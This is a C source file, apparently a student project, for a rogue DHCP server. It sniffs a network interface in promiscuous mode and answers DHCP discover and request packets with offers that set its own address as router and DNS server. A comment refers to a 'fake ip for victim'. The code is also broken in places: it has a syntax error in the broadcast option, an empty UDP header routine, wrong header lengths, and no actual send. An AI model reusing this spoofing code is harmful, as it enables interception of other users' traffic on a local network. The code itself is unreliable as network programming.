#include <linux/tcp.h>
#include <linux/udp.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include "monitor.h"
#include "dhcp.h"
#include "checksum.h"

unsigned char buffer[BUFFSIZE];
unsigned char send_buffer[BUFFSIZE];
char* IF_NAME;

unsigned char IP_AUX1 = 192;
unsigned char IP_AUX2 = 168;
unsigned char IP_AUX3 = 0;
unsigned char IP_AUX4 = 110;

int sockd;
int on;
struct ifreq ifr;
struct ifreq mac_address;
struct ifreq ip_address;
pthread_t receiver_thread, report_thread;

void setup()
{
	if((sockd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("Erro na criação do socket.\n");
		exit(1);
	}

	strcpy(ifr.ifr_name, IF_NAME);

	if(ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
	{
		printf("Erro no ioctl!\n");
		exit(1);
	}

	eth_header  = (struct ether_header*) buffer;
	ip_header   = (struct iphdr*)   (buffer + sizeof(struct ether_header));
	tcp_header  = (struct tcphdr*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
	udp_header  = (struct udphdr*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
	dhcp_header = (struct dhcp_packet*)  (buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	ioctl(sockd, SIOCGIFFLAGS, &ifr);
	ifr.ifr_flags |= IFF_PROMISC;
	ioctl(sockd, SIOCSIFFLAGS, &ifr);

	int fd;
	fd = socket(PF_INET, SOCK_DGRAM, 0);
	memset(&mac_address, 0x00, sizeof(mac_address));
	strcpy(mac_address.ifr_name, IF_NAME);
	ioctl(fd, SIOCGIFHWADDR, &mac_address);
	strcpy(ip_address.ifr_name, IF_NAME);
	ioctl(fd, SIOCGIFADDR, &ip_address);
	close(fd);
	struct in_addr x =  ((struct sockaddr_in *)&ip_address.ifr_addr)->sin_addr;
	uint32_t y = x.s_addr;
	printf("y: %x\n", htonl(y));
	char* ip_str = inet_ntoa(((struct sockaddr_in *)&ip_address.ifr_addr)->sin_addr);
	printf("%s\n", ip_str);
}

void fill_ethernet()
{
	struct ether_header* header;
	header  = (struct ether_header*) send_buffer;

	header->ether_type = 0x0800;

	for (int i = 0; i < 6; i++)
	{
		header->ether_shost[i] = mac_address.ifr_hwaddr.sa_data[i];
		header->ether_dhost[i] = eth_header->ether_shost[i];
	}

}

void fill_ip()
{
	struct iphdr* header;
	header = (struct iphdr*) (send_buffer + sizeof(struct ether_header));

	//TODO: Change this to get correct ip from machine and fake ip for victim.
	char *src_addr="192.168.1.33";
	char *dst_addr="192.168.1.34";

	header->ihl = 5;
	header->version = 4;
	header->tot_len = 20;
	header->protocol = IPPROTO_UDP;
	header->saddr = inet_addr(src_addr);
	header->daddr = inet_addr(dst_addr);
	header->check = in_cksum((unsigned short *)header, sizeof(struct iphdr));
}

void fill_udp()
{
	struct udphdr* header;
	header  = (struct udphdr*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
}

void set_magic_cookie(unsigned char* options)
{
	options[0]=0x63;
	options[1]=0x82;
	options[2]=0x53;
	options[3]=0x63;
}

void set_dhcp_message_type(unsigned char* options, unsigned char type)
{
	options[0]=53;
	options[1]=1;
	options[2]=type;
}

void set_dhcp_server_identifier(unsigned char* options)
{
	options[0]=54;
	options[1]=4;
	options[2]=IP_AUX1;
	options[3]=IP_AUX2;
	options[4]=IP_AUX3;
	options[5]=IP_AUX4;
}

void set_dhcp_subnet_mask(unsigned char* options)
{
	options[0]=1;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=0;
}

void set_dhcp_address_lease_time(unsigned char* options)
{
	options[0]=51;
	options[1]=4;
	options[2]=0;
	options[3]=1;
	options[4]=56;
	options[5]=128;
}

void set_dhcp_router(unsigned char* options)
{
	options[0]=3;
	options[1]=4;
	options[2]=IP_AUX1;
	options[3]=IP_AUX2;
	options[4]=IP_AUX3;
	options[5]=IP_AUX4;
}

void set_dhcp_dns(unsigned char* options)
{
	options[0]=6;
	options[1]=4;
	options[2]=IP_AUX1;
	options[3]=IP_AUX2;
	options[4]=IP_AUX3;
	options[5]=IP_AUX4;
}

void set_dhcp_broadcast(unsigned char* options)
{
	options[0]28;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=255;
}

void fill_dhcp(unsigned char type)
{
	struct dhcp_packet* header;
	header = (struct dhcp_packet*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	header->op = 2;
	header->htype = 1;
	header->hlen = 6;
	header->hops = 0;
	header->xid = dhcp_header->xid;
	header->secs = 0;
	header->flags = 0;

	header->ciaddr = dhcp_header->ciaddr;
	inet_aton("192.168.1.34", &header->yiaddr);
	header->siaddr = dhcp_header->siaddr;
	header->giaddr = dhcp_header->giaddr;

	for (int i = 0; i < 6; i++)
	{
		header->chaddr[i] = eth_header->ether_shost[i];
	}

	set_magic_cookie(&header->options[0]);
	set_dhcp_message_type(&header->options[4], type);
	set_dhcp_server_identifier(&header->options[7]);
	set_dhcp_subnet_mask(&header->options[13]);
	set_dhcp_address_lease_time(&header->options[19]);
	set_dhcp_router(&header->options[25]);
	set_dhcp_dns(&header->options[31]);
	set_dhcp_broadcast(&header->options[37]);
	header->options[43]=0xff;

	printf("Wil start printing stuff\n");
	for (size_t i = 0; i < 44; i++) {
		printf("%d\n", header->options[i]);
	}
}

void send_dhcp(unsigned char type)
{
	fill_ethernet();
	fill_ip();
	fill_udp();
	fill_dhcp(type);
}

void dhcp_handler()
{
	unsigned char *options = dhcp_header->options;
	int i = 4;
	while (true) {
		unsigned char type = options[i++];
		if (type == 255)
			break;
		unsigned char len = options[i++];
		if (type == 53) {
			if (options[i] == 1 || options[i] == 3) {
				send_dhcp(options[i] + 1);
			}
		}
		i+=len;
	}
}

void udp_handler()
{
	unsigned int port_dest = (unsigned int)ntohs(udp_header->dest);
	if (port_dest == 67)
		dhcp_handler();
}

void ip_handler()
{
	unsigned int ip_protocol = (unsigned int)ip_header->protocol;

	if (ip_protocol == 0x11)
		udp_handler();
}

void* sniffer()
{
	while (true)
	{

		recv(sockd,(char *) &buffer, sizeof(buffer), 0x0);

		u_int16_t ether_type = ntohs(eth_header->ether_type);
		if(ether_type == 0x0800)
			ip_handler();
	}
}

int monitor_start(int argc, char* argv[])
{

	if(argc <= 1)
	{
		printf("Format: ./main interface\n");
		return 0;
	}
	IF_NAME = argv[1];

	setup();
	/*pthread_create(&receiver_thread, NULL, sniffer, NULL);*/
	sniffer();

	return 0;
}
